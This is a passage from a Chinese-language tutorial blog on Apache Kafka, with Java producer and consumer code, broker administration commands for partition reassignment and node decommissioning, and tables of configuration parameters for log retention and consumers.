StringSerializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">    properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 指定事务id</span></span><br><span class="line">    properties.put(ProducerConfig.TRANSACTIONAL_ID_CONFIG, <span class="string">"tranactional_id_01"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 创建kafka生产者对象</span></span><br><span class="line">    <span class="comment">// "" hello</span></span><br><span class="line">    KafkaProducer&lt;String, String&gt; kafkaProducer = <span class="keyword">new</span> KafkaProducer&lt;&gt;(properties);</span><br><span class="line"></span><br><span class="line">    kafkaProducer.initTransactions();</span><br><span class="line"></span><br><span class="line">    kafkaProducer.beginTransaction();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 2 发送数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">            kafkaProducer.send(<span class="keyword">new</span> ProducerRecord&lt;&gt;(<span class="string">"first"</span>, <span class="string">"atguigu"</span> + i));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span> / <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        kafkaProducer.commitTransaction();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        kafkaProducer.abortTransaction();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 3 关闭资源</span></span><br><span class="line">        kafkaProducer.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1-7-数据顺序">1.7 数据顺序</h3><p>对于单分区来说，数据是必定有序的；多分区，分区与分区间无序</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335698.png" alt></p><h2 id="2、Kafka-Broker">2、Kafka Broker</h2><h3 id="2-1-Kafka-Broker-工作流程">2.1 Kafka Broker 工作流程</h3><p> <code>bin/zkCli.sh</code>查看zookeeper里面的文件，也可以下载PrettyZoo(推荐)可视化软件查看Zookeeper 存储的 Kafka 信息</p><p><img src="http://qnypic.shawncoding.top/blog/202401251335699.png" alt></p><p><strong>Kafka Broker 总体工作流程</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202401251335700.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看/kafka/brokers/ids 路径上的节点,首先进入了zk客户端</span></span><br><span class="line">ls /kafka/brokers/ids</span><br><span class="line"><span class="comment"># 查看/kafka/controller 路径上的数据</span></span><br><span class="line">get /kafka/controller</span><br><span class="line"><span class="comment"># 查看/kafka/brokers/topics/first/partitions/0/state 路径上的数据</span></span><br><span class="line">get /kafka/brokers/topics/first/partitions/0/state</span><br><span class="line"><span class="comment"># 停止 hadoop104 上的 kafka</span></span><br><span class="line">bin/kafka-server-stop.sh</span><br><span class="line"><span class="comment"># 然后去查看有没有变化</span></span><br><span class="line">bin/kafka-server-start.sh -daemon ./config/server.properties</span><br></pre></td></tr></table></figure><p><strong>Broker 重要参数</strong></p><table><thead><tr><th><strong>参数名称</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><a href="http://replica.lag.time.max.ms" target="_blank" rel="noopener">replica.lag.time.max.ms</a></td><td>ISR 中，如果 Follower 长时间未向 Leader 发送通信请求或同步数据，则该 Follower 将被踢出 ISR。该时间阈值，默认 30s。</td></tr><tr><td>auto.leader.rebalance.enable</td><td>默认是 true。 自动Leader Partition 平衡。</td></tr><tr><td>leader.imbalance.per.broker.percentage</td><td>默认是 10%。每个 broker 允许的不平衡的 leader的比率。如果每个 broker 超过了这个值，控制器会触发leader 的平衡。</td></tr><tr><td>leader.imbalance.check.interval.seconds</td><td>默认值 300 秒。检查 leader 负载是否平衡的间隔时间</td></tr><tr><td>log.segment.bytes</td><td>Kafka 中 log 日志是分成一块块存储的，此配置是指 log 日志划分成块的大小，默认值 1G。</td></tr><tr><td>log.index.interval.bytes</td><td>默认 4kb，kafka 里面每当写入了 4kb 大小的日志（.log），然后就往 index 文件里面记录一个索引</td></tr><tr><td>log.retention.hours</td><td>Kafka 中数据保存的时间，默认 7 天</td></tr><tr><td>log.retention.minutes</td><td>Kafka 中数据保存的时间，分钟级别，默认关闭</td></tr><tr><td><a href="http://log.retention.ms" target="_blank" rel="noopener">log.retention.ms</a></td><td>Kafka 中数据保存的时间，毫秒级别，默认关闭</td></tr><tr><td><a href="http://log.retention.check.interval.ms" target="_blank" rel="noopener">log.retention.check.interval.ms</a></td><td>检查数据是否保存超时的间隔，默认是 5 分钟</td></tr><tr><td>log.retention.bytes</td><td>默认等于-1，表示无穷大。超过设置的所有日志总大小，删除最早的 segment</td></tr><tr><td>log.cleanup.policy</td><td>默认是 delete，表示所有数据启用删除策略；如果设置值为 compact，表示所有数据启用压缩策略</td></tr><tr><td>num.io.threads</td><td>默认是 8。负责写磁盘的线程数。整个参数值要占总核数的 50%</td></tr><tr><td>num.replica.fetchers</td><td>副本拉取线程数，这个参数占总核数的 50%的 1/3</td></tr><tr><td>num.network.threads</td><td>默认是 3。数据传输线程数，这个参数占总核数的50%的 2/3</td></tr><tr><td>log.flush.interval.messages</td><td>强制页缓存刷写到磁盘的条数，默认是 long 的最大值，9223372036854775807。一般不建议修改，交给系统自己管理</td></tr><tr><td><a href="http://log.flush.interval.ms" target="_blank" rel="noopener">log.flush.interval.ms</a></td><td>每隔多久，刷数据到磁盘，默认是 null。一般不建议修改，交给系统自己管理</td></tr></tbody></table><h3 id="2-2-节点服役和退役">2.2 节点服役和退役</h3><p><strong>服役新节点</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先配置好一台新的机器，例如hadoop105</span></span><br><span class="line"><span class="comment"># 单独启动 hadoop105 中的 kafka</span></span><br><span class="line">bin/kafka-server-start.sh -daemon ./config/server.properties</span><br><span class="line"><span class="comment"># 执行负载均衡操作</span></span><br><span class="line"><span class="comment"># 创建一个要均衡的topic,在hadoop102</span></span><br><span class="line">vim topics-to-move.json</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"topics"</span>: [</span><br><span class="line">  &#123;<span class="string">"topic"</span>: <span class="string">"first"</span>&#125;</span><br><span class="line">],</span><br><span class="line">  <span class="string">"version"</span>: 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个负载均衡的计划,会成列出几个计划，自己选一个计划</span></span><br><span class="line">bin/kafka-reassign-partitions.sh --bootstrap-server hadoop102:9092 --topics-to-move-json-file topics-to-move.json --broker-list <span class="string">"0,1,2,3"</span> --generate</span><br><span class="line"><span class="comment"># 创建副本存储计划（所有副本存储在 broker0、broker1、broker2、broker3 中），从上面的计划中选取</span></span><br><span class="line">vim increase-replication-factor.json</span><br><span class="line"><span class="comment"># 执行副本存储计划</span></span><br><span class="line">bin/kafka-reassign-partitions.sh --bootstrap-server hadoop102:9092 --reassignment-json-file increase-replication-factor.json --execute</span><br><span class="line"><span class="comment"># 验证副本存储计划</span></span><br><span class="line">bin/kafka-reassign-partitions.sh --bootstrap-server hadoop102:9092 --reassignment-json-file increase-replication-factor.json --verify</span><br></pre></td></tr></table></figure><p><strong>退役旧节点</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先按照退役一台节点，生成执行计划，然后按照服役时操作流程执行负载均衡</span></span><br><span class="line">vim topics-to-move.json</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"topics"</span>: [</span><br><span class="line">  &#123;<span class="string">"topic"</span>: <span class="string">"first"</span>&#125;</span><br><span class="line">],</span><br><span class="line">  <span class="string">"version"</span>: 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建执行计划</span></span><br><span class="line">bin/kafka-reassign-partitions.sh --bootstrap-server hadoop102:9092 --topics-to-move-json-file topics-to-move.json --broker-list <span class="string">"0,1,2"</span> --generate</span><br><span class="line"><span class="comment"># 创建副本存储计划（所有副本存储在 broker0、broker1、broker2 中）,从上面选</span></span><br><span class="line">vim increase-replication-factor.json</span><br><span class="line"><span class="comment"># 执行副本存储计划</span></span><br><span class="line">bin/kafka-reassign-partitions.sh --bootstrap-server hadoop102:9092 --reassignment-json-file increase-replication-factor.json --execute</span><br><span class="line"><span class="comment"># 验证副本存储计划</span></span><br><span class="line"><span class="comment"># 查看一下信息</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --describe --topic first</span><br><span class="line"><span class="comment"># 执行停止命令</span></span><br><span class="line">bin/kafka-server-stop.sh</span><br></pre></td></tr></table></figure><h3 id="2-3-Kafka-副本基本信息">2.3 Kafka 副本基本信息</h3><ul><li>Kafka 副本作用：提高数据可靠性</li><li>Kafka 默认副本 1 个，生产环境一般配置为 2 个，保证数据可靠性；太多副本会增加磁盘存储空间，增加网络上数据传输，降低效率</li><li>Kafka 中副本分为：Leader 和 Follower。Kafka 生产者只会把数据发往Leader，然后 Follower 找 Leader 进行同步数据</li><li>Kafka 分区中的所有副本统称为 AR（Assigned Repllicas），AR = ISR + OSR<ul><li>ISR，表示和 Leader 保持同步的 Follower 集合。如果 Follower 长时间未向 Leader 发送通信请求或同步数据，则该 Follower 将被踢出 ISR。该时间阈值由 replica.lag.time.max.ms参数设定，默认 30s。Leader 发生故障之后，就会从 ISR 中选举新的 Leader</li><li>OSR，表示 Follower 与 Leader 副本同步时，延迟过多的副本。</li></ul></li></ul><p><strong>Leader 选举流程</strong></p><p>Kafka 集群中有一个 broker 的 Controller 会被选举为 Controller Leader，负责<strong>管理集群broker 的上下线</strong>，所有 topic 的<strong>分区副本分配</strong>和 Leader 选举等工作。Controller 的信息同步工作是依赖于 Zookeeper 的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个新的 topic，4 个分区，4 个副本</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --create --topic atguigu1 --partitions 4 --replication-factor 4</span><br><span class="line"><span class="comment"># 查看 Leader 分布情况</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --describe --topic atguigu1</span><br><span class="line"><span class="comment"># 停止掉 hadoop105 的 kafka 进程，并查看 Leader 分区情况</span></span><br><span class="line">bin/kafka-server-stop.sh</span><br><span class="line"><span class="comment"># 停止掉 hadoop104 的 kafka 进程，并查看 Leader 分区情况</span></span><br><span class="line"><span class="comment"># 启动 hadoop105 的 kafka 进程，并查看 Leader 分区情况</span></span><br><span class="line">bin/kafka-server-start.sh -daemon config/server.properties</span><br><span class="line"><span class="comment"># 其他也可以自己实验</span></span><br></pre></td></tr></table></figure><h3 id="2-4-Leader-和-Follower-故障处理细节">2.4 Leader 和 Follower 故障处理细节</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251335701.png" alt></p><h3 id="2-5-分区副本分配与负载平衡">2.5 分区副本分配与负载平衡</h3><p>在生产环境中，每台服务器的配置和性能不一致，但是Kafka只会根据自己的代码规则创建对应的分区副本，就会导致个别服务器存储压力较大(<strong>尽最大可能均匀分配分区</strong>)。所有需要手动调整分区副本的存储</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个新的topic，4个分区，两个副本，名称为three。将 该topic的所有副本都存储到broker0和broker1两台服务器上</span></span><br><span class="line"><span class="comment"># 创建一个新的 topic，名称为 three</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --create --partitions 4 --replication-factor 2 --topic three</span><br><span class="line"><span class="comment"># 查看分区副本存储情况</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --describe --topic three</span><br><span class="line"><span class="comment"># 创建副本存储计划（所有副本都指定存储在 broker0、broker1 中）</span></span><br><span class="line">vim increase-replication-factor.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"version"</span>:1,</span><br><span class="line">  <span class="string">"partitions"</span>:[&#123;<span class="string">"topic"</span>:<span class="string">"three"</span>,<span class="string">"partition"</span>:0,<span class="string">"replicas"</span>:[0,1]&#125;,</span><br><span class="line">    &#123;<span class="string">"topic"</span>:<span class="string">"three"</span>,<span class="string">"partition"</span>:1,<span class="string">"replicas"</span>:[0,1]&#125;,</span><br><span class="line">    &#123;<span class="string">"topic"</span>:<span class="string">"three"</span>,<span class="string">"partition"</span>:2,<span class="string">"replicas"</span>:[1,0]&#125;,</span><br><span class="line">    &#123;<span class="string">"topic"</span>:<span class="string">"three"</span>,<span class="string">"partition"</span>:3,<span class="string">"replicas"</span>:[1,0]&#125;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行副本存储计划</span></span><br><span class="line">bin/kafka-reassign-partitions.sh --bootstrap-server hadoop102:9092 --reassignment-json-file increase-replication-factor.json --execute</span><br><span class="line"><span class="comment"># 验证副本存储计划</span></span><br><span class="line">bin/kafka-reassign-partitions.sh --bootstrap-server hadoop102:9092 --reassignment-json-file increase-replication-factor.json --verify</span><br><span class="line"><span class="comment"># 查看分区副本存储情况</span></span><br><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --describe --topic three</span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202401251335702.png" alt></p><table><thead><tr><th><strong>参数名称</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>auto.leader.rebalance.enable</td><td>默认是 true。 自动Leader Partition 平衡。生产环境中，leader 重选举的代价比较大，可能会带来性能影响，建议设置为 false 关闭。</td></tr><tr><td>leader.imbalance.per.broker.percentage</td><td>默认是 10%。每个 broker 允许的不平衡的 leader的比率。如果每个 broker 超过了这个值，控制器会触发 leader 的平衡。</td></tr><tr><td>leader.imbalance.check.interval.seconds</td><td>默认值 300 秒。检查 leader 负载是否平衡的间隔时间</td></tr></tbody></table><p>**增加副本因子，**在生产环境当中，由于某个主题的重要等级需要提升，我们考虑增加副本。副本数的增加需要先制定计划，然后根据计划执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --bootstrap-server hadoop102:9092 --create --partitions 3 --replication-factor 1 --topic four</span><br><span class="line"><span class="comment"># 手动增加副本存储</span></span><br><span class="line">vim increase-replication-factor.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"version"</span>: 1,</span><br><span class="line">  <span class="string">"partitions"</span>: [&#123;</span><br><span class="line">    <span class="string">"topic"</span>: <span class="string">"four"</span>,</span><br><span class="line">    <span class="string">"partition"</span>: 0,</span><br><span class="line">    <span class="string">"replicas"</span>: [0, 1, 2]</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    <span class="string">"topic"</span>: <span class="string">"four"</span>,</span><br><span class="line">    <span class="string">"partition"</span>: 1,</span><br><span class="line">    <span class="string">"replicas"</span>: [0, 1, 2]</span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    <span class="string">"topic"</span>: <span class="string">"four"</span>,</span><br><span class="line">    <span class="string">"partition"</span>: 2,</span><br><span class="line">    <span class="string">"replicas"</span>: [0, 1, 2]</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行副本存储计划</span></span><br><span class="line">bin/kafka-reassign-partitions.sh --bootstrap-server hadoop102:9092 --reassignment-json-file increase-replication-factor.json --execute</span><br></pre></td></tr></table></figure><h3 id="2-6-文件存储">2.6 文件存储</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251335703.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 思考：Topic 数据到底存储在什么位置</span></span><br><span class="line"><span class="comment"># 查看 hadoop102（或者 hadoop103、hadoop104）的/opt/module/kafka/datas/first-1（first-0、first-2）路径上的文件</span></span><br><span class="line"><span class="comment"># 直接查看 log 日志，发现是乱码</span></span><br><span class="line"><span class="comment"># 通过工具查看 index 和 log 信息</span></span><br><span class="line">kafka-run-class.sh kafka.tools.DumpLogSegments --files ./00000000000000000000.index</span><br><span class="line">kafka-run-class.sh kafka.tools.DumpLogSegments --files ./00000000000000000000.log</span><br><span class="line"></span><br><span class="line"><span class="comment"># 说明：日志存储参数配置</span></span><br><span class="line"><span class="comment"># log.segment.bytesKafka 中 log 日志是分成一块块存储的，此配置是指 log 日志划分成块的大小，默认值 1G。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># log.index.interval.bytes 默认 4kb，kafka 里面每当写入了 4kb 大小的日志（.log），然后就往 index 文件里面记录一个索引。 稀疏索引。</span></span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202401251335704.png" alt></p><p><strong>文件清理策略</strong></p><p>Kafka 中默认的日志保存时间为 7 天，可以通过调整如下参数修改保存时间</p><ul><li>log.retention.hours，最低优先级小时，默认 7 天</li><li>log.retention.minutes，分钟</li><li><a href="http://log.retention.ms" target="_blank" rel="noopener">log.retention.ms</a>，最高优先级毫秒</li><li><a href="http://log.retention.check.interval.ms" target="_blank" rel="noopener">log.retention.check.interval.ms</a>，负责设置检查周期，默认 5 分钟</li></ul><p>那么日志一旦超过了设置的时间，怎么处理呢？Kafka 中提供的<strong>日志清理策略有 delete 和 compact 两种</strong></p><ul><li>delete 日志删除：将过期数据删除。log.cleanup.policy = delete 所有数据启用删除策略<ul><li><strong>基于时间：默认打开。以 segment 中所有记录中的最大时间戳作为该文件时间戳</strong></li><li>基于大小：默认关闭。超过设置的所有日志总大小，删除最早的 segment。log.retention.bytes，默认等于-1，表示无穷大</li></ul></li><li>compact 日志压缩：**对于相同key的不同value值，只保留最后一个版本，**log.cleanup.policy = compact 所有数据启用压缩策略<ul><li>压缩后的offset可能是不连续的，当从这些offset消费消息时，将会拿到比这个offset大的offset对应的消息，实际上会拿到offset为7的消息，并从这个位置开始消费</li><li><strong>这种策略只适合特殊场景，比如消息的key是用户ID，value是用户的资料</strong>，通过这种压缩策略，整个消息集里就保存了所有用户最新的资料</li></ul></li></ul><h3 id="2-7-高效读写数据-💥">2.7 高效读写数据(💥)</h3><ul><li><p><strong>Kafka 本身是分布式集群，可以采用分区技术，并行度高</strong></p></li><li><p><strong>读数据采用稀疏索引，可以快速定位要消费的数据</strong></p></li><li><p>顺序写磁盘</p><p>Kafka 的 producer 生产数据，要写入到 log 文件中，写的过程是一直追加到文件末端，为顺序写。官网有数据表明，同样的磁盘，顺序写能到 600M/s，而随机写只有 100K/s。这与磁盘的机械机构有关，顺序写之所以快，是因为其省去了大量磁头寻址的时间</p></li><li><p><strong>页缓存 + 零拷贝技术</strong></p><ul><li>零拷贝：Kafka的数据加工处理操作交由Kafka生产者和Kafka消费者处理。Kafka Broker应用层不关心存储的数据，所以就不用走应用层，传输效率高</li><li>PageCache页缓存：Kafka重度依赖底层操作系统提供的PageCache功 能。当上层有写操作时，操作系统只是将数据写入PageCache。当读操作发生时，先从PageCache中查找，如果找不到，再去磁盘中读取。实际上PageCache是把尽可能多的空闲内存都当做了磁盘缓存来使用</li></ul></li></ul><table><thead><tr><th><strong>参数</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>log.flush.interval.messages</td><td>强制页缓存刷写到磁盘的条数， 默认是long 的最大值，9223372036854775807。一般不建议修改，交给系统自己管理。</td></tr><tr><td><a href="http://log.flush.interval.ms" target="_blank" rel="noopener">log.flush.interval.ms</a></td><td>每隔多久，刷数据到磁盘，默认是 null。一般不建议修改，交给系统自己管理。</td></tr></tbody></table><h3 id="2-8-自动创建主题">2.8 自动创建主题</h3><p>如果 broker 端配置参数 <code>auto.create.topics.enable</code> 设置为 true（<strong>默认值是 true</strong>），那么当生产者向一个未创建的主题发送消息时，会<strong>自动创建一个分区数为 num.partitions（默认值为1）、副本因子为 default.replication.factor（默认值为 1）的主题</strong>。除此之外，当一个消费者开始从未知主题中读取消息时，或者当任意一个客户端向未知主题发送元数据请求时，都会自动创建一个相应主题。这种创建主题的方式是非预期的，增加了主题管理和维护的难度。</p><p><strong>生产环境建议将该参数设置为 false。</strong></p><h2 id="3、Kafka-消费者-重点">3、Kafka 消费者(重点)</h2><h3 id="3-1-Kafka-消费方式">3.1 Kafka 消费方式</h3><ul><li><p><strong>pull（拉）模 式</strong></p><p>consumer采用从broker中主动拉取数据。Kafka采用这种方式</p></li><li><p>push（推）模式</p><p>Kafka没有采用这种方式，因为由broker 决定消息发送速率，很难适应所有消费者的消费速率。例如推送的速度是50m/s， Consumer1、Consumer2就来不及处理消息。pull模式不足之处是，如果Kafka没有数据，消费者可能会陷入循环中，一直返回空数据</p></li></ul><h3 id="3-2-Kafka-消费者工作流程">3.2 Kafka 消费者工作流程</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251335705.png" alt></p><p>Consumer Group（CG）：消费者组，由多个consumer组成。形成一个消费者组的条件，是所有消费者的groupid相同</p><ul><li><strong>消费者组内每个消费者负责消费不同分区的数据，一个分区只能由一个组内消费者消费</strong></li><li><strong>消费者组之间互不影响</strong>。所有的消费者都属于某个消费者组，即消费者组是逻辑上的一个订阅者</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251335706.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251335707.png" alt></p><table><thead><tr><th><strong>参数名称</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td>bootstrap.servers</td><td>向 Kafka 集群建立初始连接用到的 host/port 列表</td></tr><tr><td>key.deserializer 和value.deserializer</td><td>指定接收消息的 key 和 value 的反序列化类型。一定要写全类名</td></tr><tr><td><a href="http://group.id" target="_blank" rel="noopener">group.id</a></td><td>标记消费者所属的消费者组</td></tr><tr><td>enable.auto.commit</td><td>默认值为 true，消费者会自动周期性地向服务器提交偏移量</td></tr><tr><td><a href="http://auto.commit.interval.ms" target="_blank" rel="noopener">auto.commit.interval.ms</a></td><td>如果设置了 enable.auto.commit 的值为 true， 则该值定义了消费者偏移量向Kafka 提交的频率，默认 5s</td></tr><tr><td>auto.offset.reset</td><td>当 Kafka 中没有初始偏移量或当前偏移量在服务器中不存在（如，数据被删除了），该如何处理？ earliest：自动重置偏移量到最早的偏移量。 latest：默认，自动重置偏移量为最新的偏移量。 none：如果消费组原来的（previous）偏移量不存在，则向消费者抛异常。 anything：向消费者抛异常。</td></tr><tr><td>offsets.topic.num.partitions</td><td>consumer_offsets 的分区数，默认是 50 个分区。</td></tr><tr><td><a href="http://heartbeat.interval.ms" target="_blank" rel="noopener">heartbeat.interval.ms</a></td><td>Kafka 消费者和 coordinator 之间的心跳时间，默认 3s。该条目的值必须小于 <a href="http://session.timeout.ms" target="_blank" rel="noopener">session.timeout.ms</a> ， <a href="http://xn--session-3w3kyxxoq96lrw3hqvsb.timeout.ms" target="_blank" rel="noopener">也不应该高于session.timeout.ms</a> 的 1/3。</td></tr><tr><td><a href="http://session.timeout.ms" target="_blank" rel="noopener">session.timeout.ms</a></td><td>Kafka 消费者和 coordinator 之间连接超时时间，默认 45s。超过该值，该消费者被移除，消费者组执行再平衡。</td></tr><tr><td><a href="http://max.poll.interval.ms" target="_blank" rel="noopener">max.poll.interval.ms</a></td><td>消费者处理消息的最大时长，默认是 5 分钟。超过该值，该消费者被移除，消费者组执行再平衡。</td></tr><tr><td>fetch.min.bytes</td><td>默认 1 个字节。消费者获取服务器端一批消息最小的字节数。</td></tr><tr><td><a href="http://fetch.max.wait.ms" target="_blank" rel="noopener">fetch.max.wait.ms</a></td><td>默认 500ms。如果没有从服务器端获取到一批数据的最小字节数。该时间到，仍然会返回数据。</td></tr><tr><td>fetch.max.bytes</td><td>默认Default: 52428800（50 m）。消费者获取服务器端一批消息最大的字节数。如果服务器端一批次的数据大于该值（50m）仍然可以拉取回来这批数据，因此，这不是一个绝对最大值。一批次的大小受 message.max.bytes （ broker config）or max.message.bytes （topic config）影响。</td></tr><tr><td>max.poll.records</td><td>一次 poll 拉取数据返回消息的最大条数，默认是 500 条。</td></tr></tbody></table><h3 id="3-3-消费者API">3.3 消费者API</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0 配置</span></span><br><span class="line">    Properties properties = <span class="keyword">new</span> Properties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 连接 bootstrap.servers</span></span><br><span class="line">    properties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG,<span class="string">"hadoop102:9092,hadoop103:9092"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化</span></span><br><span class="line">    properties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">    properties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 配置消费者组id</span></span><br><span class="line">    properties.put(ConsumerConfig.GROUP_ID_CONFIG,<span class="string">"test5"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置分区分配策略</span></span><br><span class="line">    properties.put(ConsumerConfig.PARTITION_ASSIGNMENT_STRATEGY_CONFIG,<span class="string">"org.apache.kafka.clients.consumer.StickyAssignor"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1 创建一个消费者  "", "hello"</span></span><br><span class="line">    KafkaConsumer&lt;String, String&gt; kafkaConsumer = <span class="keyword">new</span> 